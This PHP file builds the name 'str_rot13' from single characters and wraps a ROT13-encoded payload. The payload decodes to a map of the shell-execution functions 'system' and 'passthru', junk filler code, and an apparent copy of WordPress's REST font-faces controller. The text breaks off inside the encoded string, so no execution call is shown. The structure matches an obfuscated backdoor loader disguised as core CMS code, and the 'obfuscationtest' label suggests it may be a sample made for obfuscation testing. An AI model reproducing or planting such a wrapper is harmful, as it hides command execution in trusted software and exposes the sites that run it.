<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Sbag_Snprf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.5.0
 */

/**
 * Pynff gb npprff sbag snprf guebhtu gur ERFG NCV.
 */
pynff JC_ERFG_Sbag_Snprf_Pbagebyyre rkgraqf JC_ERFG_Cbfgf_Pbagebyyre {

	/**
	 * Gur yngrfg irefvba bs gurzr.wfba fpurzn fhccbegrq ol gur pbagebyyre.
	 *
	 * @fvapr 6.5.0
	 * @ine vag
	 */
	pbafg YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ = 3;

	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 6.5.0
	 * @ine snyfr
	 */
	cebgrpgrq $nyybj_ongpu = snyfr;

	/**
	 * Ertvfgref gur ebhgrf sbe cbfgf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				'netf'   => neenl(
					'sbag_snzvyl_vq' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag sbag snzvyl bs gur sbag snpr.' ),
						'glcr'        => 'vagrtre',
						'erdhverq'    => gehr,
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_perngr_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'   => neenl(
					'sbag_snzvyl_vq' => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag sbag snzvyl bs gur sbag snpr.' ),
						'glcr'        => 'vagrtre',
						'erdhverq'    => gehr,
					),
					'vq'             => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur sbag snpr.' ),
						'glcr'        => 'vagrtre',
						'erdhverq'    => gehr,
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Jurgure gb olcnff Genfu naq sbepr qryrgvba.', 'qrsnhyg' ),
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb sbag snprf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		vs ( ! pheerag_hfre_pna( $cbfg_glcr->pnc->ernq ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq',
				__( 'Fbeel, lbh ner abg nyybjrq gb npprff sbag snprf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb n sbag snpr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		vs ( ! pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq',
				__( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf sbag snpr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Inyvqngrf frggvatf jura perngvat n sbag snpr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat          $inyhr   Rapbqrq WFBA fgevat bs sbag snpr frggvatf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea gehr|JC_Reebe Gehr vs gur frggvatf ner inyvq, bgurejvfr n JC_Reebe bowrpg.
	 */
	choyvp shapgvba inyvqngr_perngr_sbag_snpr_frggvatf( $inyhr, $erdhrfg ) {
		$frggvatf = wfba_qrpbqr( $inyhr, gehr );

		// Purpx frggvatf fgevat vf inyvq WFBA.
		vs ( ahyy === $frggvatf ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_cnenz',
				__( 'sbag_snpr_frggvatf cnenzrgre zhfg or n inyvq WFBA fgevat.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Purpx gung gur sbag snpr frggvatf zngpu gur gurzr.wfba fpurzn.
		$fpurzn             = $guvf->trg_vgrz_fpurzn()['cebcregvrf']['sbag_snpr_frggvatf'];
		$unf_inyvq_frggvatf = erfg_inyvqngr_inyhr_sebz_fpurzn( $frggvatf, $fpurzn, 'sbag_snpr_frggvatf' );

		vs ( vf_jc_reebe( $unf_inyvq_frggvatf ) ) {
			$unf_inyvq_frggvatf->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			erghea $unf_inyvq_frggvatf;
		}

		// Purpx gung abar bs gur erdhverq frggvatf ner rzcgl inyhrf.
		$erdhverq = $fpurzn['erdhverq'];
		sbernpu ( $erdhverq nf $xrl ) {
			vs ( vffrg( $frggvatf[ $xrl ] ) && ! $frggvatf[ $xrl ] ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_cnenz',
					/* genafyngbef: %f: Anzr bs gur zvffvat sbag snpr frggvatf cnenzrgre, r.t. \"sbag_snpr_frggvatf[fep]\". */
					fcevags( __( '%f pnaabg or rzcgl.' ), \"sbag_snpr_frggvat[ $xrl ]\" ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		$fepf  = vf_neenl( $frggvatf['fep'] ) ? $frggvatf['fep'] : neenl( $frggvatf['fep'] );
		$svyrf = $erdhrfg->trg_svyr_cnenzf();

		sbernpu ( $fepf nf $fep ) {
			// Purpx gung rnpu fep vf n aba-rzcgl fgevat.
			$fep = ygevz( $fep );
			vs ( rzcgl( $fep ) ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_cnenz',
					/* genafyngbef: %f: Sbag snpr fbhepr cnenzrgre anzr: \"sbag_snpr_frggvatf[fep]\". */
					fcevags( __( '%f inyhrf zhfg or aba-rzcgl fgevatf.' ), 'sbag_snpr_frggvatf[fep]' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			// Purpx gung fepf ner inyvq HEYf be svyr ersreraprf.
			vs ( snyfr === jc_uggc_inyvqngr_hey( $fep ) && ! vffrg( $svyrf[ $fep ] ) ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_cnenz',
					/* genafyngbef: 1: Sbag snpr fbhepr cnenzrgre anzr: \"sbag_snpr_frggvatf[fep]\", 2: Gur vainyvq fep inyhr. */
					fcevags( __( '%1$f inyhr \"%2$f\" zhfg or n inyvq HEY be svyr ersrerapr.' ), 'sbag_snpr_frggvatf[fep]', $fep ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		// Purpx gung rnpu svyr va gur erdhrfg ersreraprf n fep va gur frggvatf.
		sbernpu ( neenl_xrlf( $svyrf ) nf $svyr ) {
			vs ( ! va_neenl( $svyr, $fepf, gehr ) ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_cnenz',
					/* genafyngbef: 1: Svyr xrl (r.t. \"svyr-0\") va gur erdhrfg qngn, 2: Sbag snpr fbhepr cnenzrgre anzr: \"sbag_snpr_frggvatf[fep]\". */
					fcevags( __( 'Svyr %1$f zhfg or hfrq va %2$f.' ), $svyr, 'sbag_snpr_frggvatf[fep]' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Fnavgvmrf gur sbag snpr frggvatf jura perngvat n sbag snpr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $inyhr Rapbqrq WFBA fgevat bs sbag snpr frggvatf.
	 * @erghea neenl Qrpbqrq naq fnavgvmrq neenl bs sbag snpr frggvatf.
	 */
	choyvp shapgvba fnavgvmr_sbag_snpr_frggvatf( $inyhr ) {
		// Frggvatf neevir nf fgevatvsvrq WFBA, fvapr guvf vf n zhygvcneg/sbez-qngn erdhrfg.
		$frggvatf = wfba_qrpbqr( $inyhr, gehr );
		$fpurzn   = $guvf->trg_vgrz_fpurzn()['cebcregvrf']['sbag_snpr_frggvatf']['cebcregvrf'];

		// Fnavgvmr frggvatf onfrq ba pnyyonpxf va gur fpurzn.
		sbernpu ( $frggvatf nf $xrl => $inyhr ) {
			$fnavgvmr_pnyyonpx = $fpurzn[ $xrl ]['net_bcgvbaf']['fnavgvmr_pnyyonpx'];
			$frggvatf[ $xrl ]  = pnyy_hfre_shap( $fnavgvmr_pnyyonpx, $inyhr );
		}

		erghea $frggvatf;
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs sbag snprf jvguva gur cnerag sbag snzvyl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$sbag_snzvyl = $guvf->trg_cnerag_sbag_snzvyl_cbfg( $erdhrfg['sbag_snzvyl_vq'] );
		vs ( vf_jc_reebe( $sbag_snzvyl ) ) {
			erghea $sbag_snzvyl;
		}

		erghea cnerag::trg_vgrzf( $erdhrfg );
	}

	/**
	 * Ergevrirf n fvatyr sbag snpr jvguva gur cnerag sbag snzvyl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		// Purpx gung gur sbag snpr unf n inyvq cnerag sbag snzvyl.
		$sbag_snzvyl = $guvf->trg_cnerag_sbag_snzvyl_cbfg( $erdhrfg['sbag_snzvyl_vq'] );
		vs ( vf_jc_reebe( $sbag_snzvyl ) ) {
			erghea $sbag_snzvyl;
		}

		vs ( (vag) $sbag_snzvyl->VQ !== (vag) $cbfg->cbfg_cnerag ) {
			erghea arj JC_Reebe(
				'erfg_sbag_snpr_cnerag_vq_zvfzngpu',
				/* genafyngbef: %q: N cbfg vq. */
				fcevags( __( 'Gur sbag snpr qbrf abg orybat gb gur fcrpvsvrq sbag snzvyl jvgu vq bs \"%q\".' ), $sbag_snzvyl->VQ ),
				neenl( 'fgnghf' => 404 )
			);
		}

		erghea cnerag::trg_vgrz( $erdhrfg );
	}

	/**
	 * Perngrf n sbag snpr sbe gur cnerag sbag snzvyl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		$sbag_snzvyl = $guvf->trg_cnerag_sbag_snzvyl_cbfg( $erdhrfg['sbag_snzvyl_vq'] );
		vs ( vf_jc_reebe( $sbag_snzvyl ) ) {
			erghea $sbag_snzvyl;
		}

		// Frggvatf unir nyernql orra qrpbqrq ol ::fnavgvmr_sbag_snpr_frggvatf().
		$frggvatf    = $erdhrfg->trg_cnenz( 'sbag_snpr_frggvatf' );
		$svyr_cnenzf = $erdhrfg->trg_svyr_cnenzf();

		// Purpx gung gur arprffnel sbag snpr cebcregvrf ner havdhr.
		$dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'              => $guvf->cbfg_glcr,
				'cbfgf_cre_cntr'         => 1,
				'gvgyr'                  => JC_Sbag_Hgvyf::trg_sbag_snpr_fyht( $frggvatf ),
				'hcqngr_cbfg_zrgn_pnpur' => snyfr,
				'hcqngr_cbfg_grez_pnpur' => snyfr,
			)
		);
		vs ( ! rzcgl( $dhrel->cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_qhcyvpngr_sbag_snpr',
				__( 'N sbag snpr zngpuvat gubfr frggvatf nyernql rkvfgf.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Zbir gur hcybnqrq sbag nffrg sebz gur grzc sbyqre gb gur sbagf qverpgbel.
		vs ( ! shapgvba_rkvfgf( 'jc_unaqyr_hcybnq' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		}

		$fepf           = vf_fgevat( $frggvatf['fep'] ) ? neenl( $frggvatf['fep'] ) : $frggvatf['fep'];
		$cebprffrq_fepf = neenl();
		$sbag_svyr_zrgn = neenl();

		sbernpu ( $fepf nf $fep ) {
			// Vs fep abg n svyr ersrerapr, hfr vg nf vf.
			vs ( ! vffrg( $svyr_cnenzf[ $fep ] ) ) {
				$cebprffrq_fepf[] = $fep;
				pbagvahr;
			}

			$svyr      = $svyr_cnenzf[ $fep ];
			$sbag_svyr = $guvf->unaqyr_sbag_svyr_hcybnq( $svyr );
			vs ( vf_jc_reebe( $sbag_svyr ) ) {
				erghea $sbag_svyr;
			}

			$cebprffrq_fepf[] = $sbag_svyr['hey'];
			$sbag_svyr_zrgn[] = $guvf->eryngvir_sbagf_cngu( $sbag_svyr['svyr'] );
		}

		// Fgber gur hcqngrq frggvatf sbe cercner_vgrz_sbe_qngnonfr gb hfr.
		$frggvatf['fep'] = pbhag( $cebprffrq_fepf ) === 1 ? $cebprffrq_fepf[0] : $cebprffrq_fepf;
		$erdhrfg->frg_cnenz( 'sbag_snpr_frggvatf', $frggvatf );

		// Rafher gung $frggvatf qngn vf fynfurq, fb inyhrf jvgu dhbgrf ner rfpncrq.
		// JC_ERFG_Cbfgf_Pbagebyyre::perngr_vgrz hfrf jc_fynfu() ba gur cbfg_pbagrag.
		$sbag_snpr_cbfg = cnerag::perngr_vgrz( $erdhrfg );

		vs ( vf_jc_reebe( $sbag_snpr_cbfg ) ) {
			erghea $sbag_snpr_cbfg;
		}

		$sbag_snpr_vq = $sbag_snpr_cbfg->qngn['vq'];

		sbernpu ( $sbag_svyr_zrgn nf $sbag_svyr_cngu ) {
			nqq_cbfg_zrgn( $sbag_snpr_vq, '_jc_sbag_snpr_svyr', $sbag_svyr_cngu );
		}

		erghea $sbag_snpr_cbfg;
	}

	/**
	 * Qryrgrf n fvatyr sbag snpr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		$sbag_snzvyl = $guvf->trg_cnerag_sbag_snzvyl_cbfg( $erdhrfg['sbag_snzvyl_vq'] );
		vs ( vf_jc_reebe( $sbag_snzvyl ) ) {
			erghea $sbag_snzvyl;
		}

		vs ( (vag) $sbag_snzvyl->VQ !== (vag) $cbfg->cbfg_cnerag ) {
			erghea arj JC_Reebe(
				'erfg_sbag_snpr_cnerag_vq_zvfzngpu',
				/* genafyngbef: %q: N cbfg vq. */
				fcevags( __( 'Gur sbag snpr qbrf abg orybat gb gur fcrpvsvrq sbag snzvyl jvgu vq bs \"%q\".' ), $sbag_snzvyl->VQ ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$sbepr = vffrg( $erdhrfg['sbepr'] ) ? (obby) $erdhrfg['sbepr'] : snyfr;

		// Jr qba'g fhccbeg genfuvat sbe sbag snprf.
		vs ( ! $sbepr ) {
			erghea arj JC_Reebe(
				'erfg_genfu_abg_fhccbegrq',
				/* genafyngbef: %f: sbepr=gehr */
				fcevags( __( 'Sbag snprf qb abg fhccbeg genfuvat. Frg \"%f\" gb qryrgr.' ), 'sbepr=gehr' ),
				neenl( 'fgnghf' => 501 )
			);
		}

		erghea cnerag::qryrgr_vgrz( $erdhrfg );
	}

	/**
	 * Cercnerf n fvatyr sbag snpr bhgchg sbe erfcbafr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = $vgrz->VQ;
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'gurzr_wfba_irefvba', $svryqf ) ) {
			$qngn['gurzr_wfba_irefvba'] = fgngvp::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cnerag', $svryqf ) ) {
			$qngn['cnerag'] = $vgrz->cbfg_cnerag;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'sbag_snpr_frggvatf', $svryqf ) ) {
			$qngn['sbag_snpr_frggvatf'] = $guvf->trg_frggvatf_sebz_cbfg( $vgrz );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $vgrz );
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		/**
		 * Svygref gur sbag snpr qngn sbe n ERFG NCV erfcbafr.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Cbfg          $cbfg     Sbag snpr cbfg bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_jc_sbag_snpr', $erfcbafr, $vgrz, $erdhrfg );
	}

	/**
	 * Ergevrirf gur cbfg'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => $guvf->cbfg_glcr,
			'glcr'       => 'bowrpg',
			// Onfr cebcregvrf sbe rirel Cbfg.
			'cebcregvrf' => neenl(
				'vq'                 => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur cbfg.', 'qrsnhyg' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'gurzr_wfba_irefvba' => neenl(
					'qrfpevcgvba' => __( 'Irefvba bs gur gurzr.wfba fpurzn hfrq sbe gur glcbtencul frggvatf.' ),
					'glcr'        => 'vagrtre',
					'qrsnhyg'     => fgngvp::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ,
					'zvavzhz'     => 2,
					'znkvzhz'     => fgngvp::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ,
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'cnerag'             => neenl(
					'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag sbag snzvyl bs gur sbag snpr.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				// Sbag snpr frggvatf pbzr qverpgyl sebz gurzr.wfba fpurzn
				// Frr uggcf://fpurznf.jc.bet/gehax/gurzr.wfba
				'sbag_snpr_frggvatf' => neenl(
					'qrfpevcgvba'          => __( 'sbag-snpr qrpynengvba va gurzr.wfba sbezng.' ),
					'glcr'                 => 'bowrpg',
					'pbagrkg'              => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'cebcregvrf'           => neenl(
						'sbagSnzvyl'            => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-snzvyl inyhr.' ),
							'glcr'        => 'fgevat',
							'qrsnhyg'     => '',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => neenl( 'JC_Sbag_Hgvyf', 'fnavgvmr_sbag_snzvyl' ),
							),
						),
						'sbagFglyr'             => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-fglyr inyhr.' ),
							'glcr'        => 'fgevat',
							'qrsnhyg'     => 'abezny',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'sbagJrvtug'            => neenl(
							'qrfpevcgvba' => __( 'Yvfg bs ninvynoyr sbag jrvtugf, frcnengrq ol n fcnpr.' ),
							'qrsnhyg'     => '400',
							// Punatrq sebz `barBs` gb nibvq reebef sebz ybbfr glcr purpxvat.
							// r.t. n sbagJrvtug bs \"400\" inyvqngrf nf obgu n fgevat naq na vagrtre qhr gb vf_ahzrevp purpx.
							'glcr'        => neenl( 'fgevat', 'vagrtre' ),
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'sbagQvfcynl'           => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-qvfcynl inyhr.' ),
							'glcr'        => 'fgevat',
							'qrsnhyg'     => 'snyyonpx',
							'rahz'        => neenl(
								'nhgb',
								'oybpx',
								'snyyonpx',
								'fjnc',
								'bcgvbany',
							),
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'fep'                   => neenl(
							'qrfpevcgvba' => __( 'Cnguf be HEYf gb gur sbag svyrf.' ),
							// Punatrq sebz `barBs` gb `nalBs` qhr gb erfg_fnavgvmr_neenl pbairegvat n fgevat vagb na neenl,
							// naq pnhfvat n \"zngpurf zber guna bar bs gur rkcrpgrq sbezngf\" reebe.
							'nalBs'       => neenl(
								neenl(
									'glcr' => 'fgevat',
								),
								neenl(
									'glcr'  => 'neenl',
									'vgrzf' => neenl(
										'glcr' => 'fgevat',
									),
								),
							),
							'qrsnhyg'     => neenl(),
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => shapgvba ( $inyhr ) {
									erghea vf_neenl( $inyhr ) ? neenl_znc( neenl( $guvf, 'fnavgvmr_fep' ), $inyhr ) : $guvf->fnavgvmr_fep( $inyhr );
								},
							),
						),
						'sbagFgergpu'           => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-fgergpu inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'nfpragBireevqr'        => neenl(
							'qrfpevcgvba' => __( 'PFF nfprag-bireevqr inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'qrfpragBireevqr'       => neenl(
							'qrfpevcgvba' => __( 'PFF qrfprag-bireevqr inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'sbagInevnag'           => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-inevnag inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'sbagSrngherFrggvatf'   => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-srngher-frggvatf inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'sbagInevngvbaFrggvatf' => neenl(
							'qrfpevcgvba' => __( 'PFF sbag-inevngvba-frggvatf inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'yvarTncBireevqr'       => neenl(
							'qrfpevcgvba' => __( 'PFF yvar-tnc-bireevqr inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'fvmrNqwhfg'            => neenl(
							'qrfpevcgvba' => __( 'PFF fvmr-nqwhfg inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'havpbqrEnatr'          => neenl(
							'qrfpevcgvba' => __( 'PFF havpbqr-enatr inyhr.' ),
							'glcr'        => 'fgevat',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
							),
						),
						'cerivrj'               => neenl(
							'qrfpevcgvba' => __( 'HEY gb n cerivrj vzntr bs gur sbag snpr.' ),
							'glcr'        => 'fgevat',
							'sbezng'      => 'hev',
							'qrsnhyg'     => '',
							'net_bcgvbaf' => neenl(
								'fnavgvmr_pnyyonpx' => 'fnavgvmr_hey',
							),
						),
					),
					'erdhverq'             => neenl( 'sbagSnzvyl', 'fep' ),
					'nqqvgvbanyCebcregvrf' => snyfr,
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur vgrz'f fpurzn sbe qvfcynl / choyvp pbafhzcgvba checbfrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Choyvp vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_choyvp_vgrz_fpurzn() {

		$fpurzn = cnerag::trg_choyvp_vgrz_fpurzn();

		// Nyfb erzbir `net_bcgvbaf' sebz puvyq sbag_snzvyl_frggvatf cebcregvrf, fvapr gur cnerag
